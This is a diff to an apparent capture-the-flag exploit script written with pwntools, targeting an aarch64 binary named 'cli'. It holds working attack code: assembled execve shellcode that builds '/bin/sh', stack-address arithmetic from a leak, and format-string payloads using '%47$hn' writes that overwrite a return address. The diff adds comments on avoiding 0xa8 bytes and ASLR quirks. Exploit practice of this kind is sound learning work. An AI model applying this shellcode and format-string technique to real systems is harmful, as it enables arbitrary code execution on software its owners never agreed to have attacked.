@@ -30,6 +30,7 @@ if args.GDB:
 #  q = process("xfce4-terminal --title=GDB-Pwn --zoom=0 --geometry=128x98+2900+0 -x gdb-multiarch -ex 'source ~/gdb.plugins/gef/gef.py' -ex 'set architecture aarch64' -ex 'file ./cli' -ex 'gef-remote localhost:1235' -ex 'b main' -ex 'b *0x0000005500000d4c' -ex 'c'", shell=True)
   q = process("xfce4-terminal --title=GDB-Pwn --zoom=0 --geometry=128x98+2900+0 -x gdb-multiarch -ex 'source ~/gdb.plugins/pwndbg/gdbinit.py' -ex 'set architecture aarch64' -ex 'file ./cli' -ex 'target remote localhost:1235' -ex 'b main' -ex 'b *0x0000005500000d4c' -ex 'b *0x0000005500000c6c' -ex 'c'", shell=True)
 
+# execve shellcode modified to avoir 0xa8 byte in (that does not pas..)
 shellc = asm('''
     mov  x1, #0x622F
     movk x1, #0x6E69, lsl #16
@@ -59,13 +60,14 @@ stack_ret = leak-37
 print('buffer stack address = '+hex(leak))
 print('ret_address = '+hex(stack_ret))
 
+# same than exp.py, but to avoid writing to address ending by 0xa8 cause of bad aslr
 print('leak+3 = '+hex(leak+3))
 temp = (((leak+offset)<<8) & 0xffff)
 payload = '%'+str(temp)+'c%47$hn'
 payload = payload.ljust(16,'A')
 payload += p64(stack_ret-1)
 p.sendlineafter('> ', 'echo '+payload)
-
+#
 temp = (((leak+offset)>>8) & 0xff)
 payload = '%'+str(temp)+'c%47$hhn'
 payload = payload.ljust(16,'A')
